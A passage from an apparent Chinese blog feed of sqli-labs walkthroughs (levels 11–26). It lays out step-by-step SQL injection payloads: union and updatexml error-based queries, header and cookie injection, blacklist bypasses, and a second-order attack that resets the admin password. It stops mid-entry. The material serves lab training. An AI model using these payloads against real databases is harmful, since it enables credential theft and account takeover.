<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; or 1=1 #   万能密码构造成功，返回账户和密码</span><br></pre></td></tr></table></figure>
<p>说明：这里的注释要使用#，之前的--+不再适用</p>
</li>
<li><p>猜解SQL查询语句中的<strong>字段数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by 2 #   返回正确信息</span><br><span class="line">1&#x27; order by 3 #   返回错误信息</span><br></pre></td></tr></table></figure>
<p>说明字段数为2</p>
</li>
<li><p>获取当前<strong>数据库名和数据库版本号</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select database(),version() #   返回Your Login name:security  Your Password:5.7.26</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; #</span><br><span class="line">返回emails,referers,uagents,users</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; #</span><br><span class="line">返回id,username,password</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(username,&#x27;:&#x27;,password) from users #  返回用户名和密码</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="第12关和第11关差不多，只是要用1”-or-1-x3D-1"><a href="#第12关和第11关差不多，只是要用1”-or-1-x3D-1" class="headerlink" title="第12关和第11关差不多，只是要用1”) or 1&#x3D;1 #"></a>第12关和第11关差不多，只是要用1”) or 1&#x3D;1 #</h2><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>如果前面掌握了，这关没有难度</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_17</title>
    <url>/2022/11/11/sqli-labs_17/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本关开始有了新变化，是一个更新密码的页面，这说明已经成功进入了系统，接下来就看看如何解决吧。</p>
<span id="more"></span>

<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><ol>
<li>判断是否存在<strong>SQL注入</strong>并判断注入类型<br>如果不知道源码，去一遍遍尝试，会发现无论是布尔盲注还是时间盲注都无法得到预期结果，因此我们可以采用报错注入。<br>首先，那我们可以从源码中发现，有一个过滤函数check_input，其过滤步骤是：</li>
</ol>
<ul>
<li><code>substr($value,0,15)</code>截断到15位</li>
<li>单引号，双引号，反斜杠，null自动使用反斜杠转义</li>
<li>stripslashes()去掉多余的反斜杠<br>然后，passwd没有使用过滤函数过滤，因而可以进行注入。由此可使用报错注入。</li>
</ul>
<ol start="2">
<li><p>获取当前<strong>数据库名和数据库版本号</strong><br>第一个用户名填写：admin<br>第二个密码填写所需的报错注入：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">123&#x27; and (updatexml(1,concat(0x5c,version(),0x5c),1))#     爆版本</span><br><span class="line">123&#x27; and (updatexml(1,concat(0x5c,database(),0x5c),1))#    爆数据库</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">123&#x27; and (updatexml(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x5c),1))#      爆表名</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">123&#x27; and (updatexml(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name =&#x27;users&#x27;),0x5c),1))#    爆字段名</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27; and updatexml(1,concat(0x7e,(select username from (select username from users limit 0,1)test),0x7e),1) #  爆用户</span><br><span class="line">admin&#x27; and updatexml(1,concat(0x7e,(select username from (select username from users where username=&#x27;admin&#x27; limit 0,1)test),0x7e),1) #      爆密码</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>本关的重点在于找到注入方式，如何去通过报错注入获取所需信息。技术上仍然还是那些。也可参见第二篇致谢的其它报错函数注入。</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a><br><a href="https://blog.csdn.net/dreamthe/article/details/123795302">详细sqli-labs（1-65）通关讲解</a><br><a href="https://cloud.tencent.com/developer/article/1906116">全网最全sqli-labs通关攻略</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_18</title>
    <url>/2022/11/15/sqli-labs_18/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在这一关的时候出了bug，没有报错。查了半天原因，最终猜测是数据库版本的问题，让人实在难受，最终只得重新删除sqli-labs再次下载。在这里郑重警示自己，不要使用MySQL5.7.26及以上的数据库。</p>
<span id="more"></span>

<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>测试并判断注入类型<br>首先username和password输入admin<br>发现返回如下情况：<br><img src="/simg/sqli-labs_18.png" alt="返回情况"><br>返回了ip和user-agent的识别客户使用的操作系统及版本、CPU 类型、浏览器及版本、浏览器渲染引擎、浏览器语言、浏览器插件等<br>我们通过源码的check_input可以得知，username和passwd都被过滤了。所以我们不能使用在POST处注入手段。<br>继续检查源码，可以发现这条语句：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">insert</span><span class="operator">=</span>&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;;</span><br></pre></td></tr></table></figure>
<p>因此我们可以从user-agent处注入。</p>
</li>
<li><p>通过burp抓包注入<br>burp的下载安装配置这里暂且不提，默认已弄好。<br>注意，如果是第一次抓包，会无法抓到，因为浏览器默认是不会抓127.0.0.1的包，需要自己设置。<br>打开Firefox，搜索about:config。<br>然后在访问后的搜索框内搜索 network.proxy.allow_hijacking_localhost，将值改为true</p>
</li>
</ol>
<p>另外还有一种方法，是将127改为自己的内网网址192.168.x.x<br>但这个方法我没成功，所以暂时搁置。</p>
<p>输入正确的用户名和密码后，在burp抓包，把user-agent的值改为我们需要注入的内容。如下图所示：<br><img src="/simg/sqli-labs_18_3.png" alt=" "></p>
<ol start="3">
<li><p>获取当前<strong>数据库名和数据库版本号</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;or updatexml(1,concat(0x7e,(select database()),0x7e),1) or&#x27;</span><br><span class="line">&#x27;or updatexml(1,concat(0x7e,(select version()),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or (updatexml(1,concat(0x7e,(SELECT concat_ws(&#x27;:&#x27;,username,password) FROM (SELECT username,password FROM users)text LIMIT 0,1),0x7e),1)) or &#x27; </span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>从本关开始，不再局限于提交方式了</p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_19</title>
    <url>/2022/11/15/sqli-labs_19/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本关的思路和前一关的思路是类似的，只不过稍微作了点变化。</p>
<span id="more"></span>

<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><ol>
<li><p>测试并判断注入类型<br>首先username和password输入admin<br>发现返回如下情况：<br><img src="/simg/sqli-labs_19.png" alt="返回情况"><br>返回了Referer<br>Referer是HTTP头的一个字段，用于告诉服务器该网页是从哪个页面链接过来的<br>这一次，我们在Referer的字段注入。</p>
</li>
<li><p>获取当前<strong>数据库名和数据库版本号</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;or updatexml(1,concat(0x7e,(select database()),0x7e),1) or&#x27;</span><br><span class="line">&#x27;or updatexml(1,concat(0x7e,(select version()),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or (updatexml(1,concat(0x7e,(SELECT concat_ws(&#x27;:&#x27;,username,password) FROM (SELECT username,password FROM users)text LIMIT 0,1),0x7e),1)) or &#x27; </span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>思路一致，so easy~</p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_20</title>
    <url>/2022/11/15/sqli-labs_20/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本次的难度也不大，关键是要知道方法</p>
<span id="more"></span>

<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>测试并判断注入类型<br>正常输入了admin之后，我们发现出现了如下界面：<br><img src="/simg/sqli-labs_20.png" alt="返回情况"><br>点击下方的按钮，返回到原来界面<br>接下来我们再次输入admin，并显示到该界面，可以明显看出，cookie字段显示出来。<br>然后我们按F12，点击存储，再点击Cookie下的链接，修改值为admin’<br>刷新后，出现报错，说明存在注入。<br>因此我们可以利用修改cookie的方式进行注入</p>
</li>
<li><p>猜解SQL查询语句中的字段数</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">admin<span class="string">&#x27;order by 4 #</span></span><br></pre></td></tr></table></figure>
<p>报错，说明字段数为3</p>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,database(),version() #</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; #</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; #</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,2,group_concat(username,&#x27;:&#x27;,password) from users #</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>若问我为什么知道这么做，我只能说，在网上看来的。( ╯□╰ )</p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_21+22</title>
    <url>/2022/11/15/sqli-labs_21+22/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关开始用到加解密了</p>
<span id="more"></span>

<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>测试并判断注入类型<br>通过输入admin，可以得到如下界面：<br><img src="/simg/sqli-labs_21.png" alt="返回情况"><br>通过观察，发现cookie变成了：uname &#x3D; YWRtaW4<br>有经验后可以判断出是经过了base64加密，于是我们用解密工具，可以解出值为：admin<br>接下来判断注入类型，开启burp抓包，把base64加密后的’修改到cookie，如下所示：<br><img src="/simg/sqli-labs_21_2.png" alt=" "><br>得到报错信息，可知注入方式为 ‘)</p>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;) union select 1,database(),version() #</span><br><span class="line">JykgdW5pb24gc2VsZWN0IDEsZGF0YWJhc2UoKSx2ZXJzaW9uKCkgIw==</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; #</span><br><span class="line">JykgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT0nc2VjdXJpdHknICM=</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; #</span><br><span class="line">JykgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQoY29sdW1uX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgdGFibGVfbmFtZT0ndXNlcnMnICM=</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;) union select 1,2,group_concat(username,&#x27;:&#x27;,password) from users #</span><br><span class="line">JykgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQodXNlcm5hbWUsJzonLHBhc3N3b3JkKSBmcm9tIHVzZXJzICM=</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="第22关"><a href="#第22关" class="headerlink" title="第22关"></a>第22关</h2><p>和第21关差不多，只不过注入方式是 “<br>修改一下就可以用了</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>只要判断出是那种加密方式，接下来的步骤就简单了。</p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_23</title>
    <url>/2022/11/16/sqli-labs_23/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>再次回归GET注入，只是已有变化了</p>
<span id="more"></span>

<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li>测试并判断注入类型<br>输入<code>?id=1</code> 返回用户名和密码<br>输入<code>?id=1&#39;</code> 返回报错<br>输入<code>?id=1&#39;order by 3 --+</code> 返回报错<br>输入<code>?id=1&#39;order by 3 #</code> 返回报错<br>可以查看源码，发现了一个preg_replace()函数<br>这里作用是相当于将$id中的$reg类型的字符转变位$replace字符，也就是将$id中的#和--置空过滤<br>说明注释被过滤了，那么接下来将提供两种思路</li>
</ol>
<h2 id="第1种"><a href="#第1种" class="headerlink" title="第1种"></a>第1种</h2><p>采用URL终止符<code>%00</code></p>
<ol start="2">
<li><p>猜解SQL查询语句中的字段数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;order by 4; %00</span><br></pre></td></tr></table></figure>
</li>
<li><p>爆出显示位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,3; %00</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,database(),version(); %00</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27;; %00</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27;; %00</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(username,&#x27;:&#x27;,password) from users; %00</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="第2种"><a href="#第2种" class="headerlink" title="第2种"></a>第2种</h2><p>单引号闭合<code>?id=1&#39; or &#39;1&#39;=&#39;1</code></p>
<ol start="2">
<li><p>猜解SQL查询语句中的字段数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 6,2,3,4 or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p>爆出显示位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 6,2,3,4 or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 6,database(),3 or &#x27;1&#x27;=&#x27;1</span><br><span class="line">?id=-1&#x27; union select 6,version(),3 or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),3 or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),3 or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(username,&#x27;:&#x27;,password) from users),3 or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>主要是把注入方式搞清楚，构造语句和原来差不多</p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_24</title>
    <url>/2022/11/17/sqli-labs_24/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关又采用了新的一种注入方式，和以往不太一样。</p>
<span id="more"></span>

<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>测试并判断注入类型<br>进入页面，我们可以看到有3个页面：log in, forgot password, new user<br>在log in 页面输入错误的账户名密码时，会返回错误页面。而当输入正确时，返回正确页面，并且可以更改密码。<br>查看源码时，可以发现，登录和注册页面都使用了mysql_real_escape_string()函数。<br>mysql_real_escape_string()函数的作用简单来说，是转义SQL语句中使用的字符串中的特殊字符。详细可看：<a href="https://www.w3school.com.cn/php/func_mysql_real_escape_string.asp">PHP mysql_real_escape_string() 函数</a><br>因此，我们无法通过用户名和密码进行注入。但是，我们在查看pass_change.php时，可以发现这一行语句：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$username<span class="operator">=</span> $_SESSION[&quot;username&quot;];</span><br></pre></td></tr></table></figure>
<p>也即修改密码时，用户名不会转义。<br>通常情况下，我们并不知晓admin的账户密码，因此只能猜测用户名是admin，去创造一个新用户为<code>admin&#39;#</code>的账号来绕过admin，修改admin的密码。这里涉及到了二次注入的概念。<br>二次注入：攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。<br>二次注入，可以概括为以下两步:<br>第一步：插入恶意数据进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。<br>第二步：引用恶意数据开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</p>
</li>
<li><p>注册新用户绕过admin修改admin的密码<br>首先注册一个账号，名为<code>admin&#39;#</code><br>密码123456<br>然后登录该账号<br>再修改密码为111111<br>可以看到页面显示修改成功<br>我们再次登录，账号：admin  密码：111111<br>发现管理员账户登录就成功了。</p>
</li>
</ol>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>二次注入的简单实践。</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a><br><a href="https://blog.csdn.net/dreamthe/article/details/123795302">详细sqli-labs（1-65）通关讲解</a><br><a href="https://blog.csdn.net/qq_42266432/article/details/120072927">sqli-labs第二十四关(二阶注入)</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_25+25a</title>
    <url>/2022/11/17/sqli-labs_25+25a/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关页面上有明显提示，可以巧妙利用一下</p>
<span id="more"></span>

<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li>测试并判断注入类型<br>首先本关页面出现了明显提示，or和and似乎都不能使用了。但我们检查源码时，我们可以发现这一段函数<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/AND/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
从这个函数可以发现，or和and被替换成空了，但这个替换只会检查一次所有字符，将字符里的所有含or或and的字符替换成空字符。<br>下面尝试注入</li>
</ol>
<p><code>?id=1</code><br>返回正常<br><code>?id=1&#39;</code><br>返回错误<br>因此可以以这种方式注入<code> ?id=1&#39; --+ </code><br>但要注意，语句中存在or字符时，需要写成oorr，这样中间的or被替换为空字符后，剩下的字符仍然能构成or<br>and字符也是同理<br>By the way, 函数只是把or和and字符过滤，但和or字符相同含义的||没有被过滤，and字符相同含义的&amp;&amp;没有被过滤。因此有时也可用||和&amp;&amp;代替。</p>
<ol start="2">
<li><p>猜解SQL查询语句中的字段数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;oorrder by 4 --+</span><br></pre></td></tr></table></figure>
</li>
<li><p>爆出显示位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,database(),version() --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(column_name) from infoorrmation_schema.columns where table_name=&#x27;users&#x27; --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(username,&#x27;:&#x27;,passwoorrd) from users --+</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="第25a关"><a href="#第25a关" class="headerlink" title="第25a关"></a>第25a关</h2><p>与25关类似，只是没有单引号</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>新知识+1</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_26+26a</title>
    <url>/2022/11/17/sqli-labs_26+26a/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>相当于前一关的加强版？</p>
<span id="more"></span>

<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li>测试并判断注入类型<br>源码审计<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);     <span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">  <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/and/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">  <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//strip out /*</span></span><br><span class="line">  <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out --</span></span><br><span class="line">  <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);     <span class="comment">//Strip out #</span></span><br><span class="line">  <span class="variable">$id</span>= <span class="title function_ 